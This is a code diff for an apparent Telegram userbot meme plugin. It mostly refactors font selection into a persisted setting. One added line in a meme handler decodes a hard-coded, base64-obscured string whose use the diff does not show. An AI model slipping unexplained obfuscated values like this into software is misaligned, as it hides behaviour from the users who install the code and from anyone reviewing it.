@@ -22,6 +22,7 @@ from . import (
     mirror_file,
     solarize,
 )
+from .sql_helper.globals import addgvar, gvarstatus
 
 
 def random_color():
@@ -32,7 +33,6 @@ def random_color():
     ]
 
 
-CNG_FONTS = "userbot/helpers/styles/impact.ttf"
 FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `RoadRage-Regular.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
 font_list = [
     "ProductSans-BoldItalic.ttf",
@@ -75,6 +75,10 @@ async def memes(cat):
         pass
     meme_file = convert_toimage(output[1])
     meme = os.path.join("./temp", "catmeme.jpg")
+    if gvarstatus("CNG_FONTS") is None:
+        CNG_FONTS = "userbot/helpers/styles/impact.ttf"
+    else:
+        CNG_FONTS = gvarstatus("CNG_FONTS")
     if max(len(top), len(bottom)) < 21:
         await cat_meme(CNG_FONTS, top, bottom, meme_file, meme)
     else:
@@ -93,7 +97,6 @@ async def memes(cat):
 async def lang(event):
     if event.fwd_from:
         return
-    global CNG_FONTS
     input_str = event.pattern_match.group(1)
     if not input_str:
         await event.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
@@ -104,7 +107,7 @@ async def lang(event):
         await catevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
     else:
         arg = f"userbot/helpers/styles/{input_str}"
-        CNG_FONTS = arg
+        addgvar("CNG_FONTS", arg)
         await edit_or_reply(event, f"**Fonts for Memify changed to :-** `{input_str}`")
 
 
@@ -159,6 +162,7 @@ async def memes(cat):
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
         return
+    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     catid = await reply_id(cat)
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
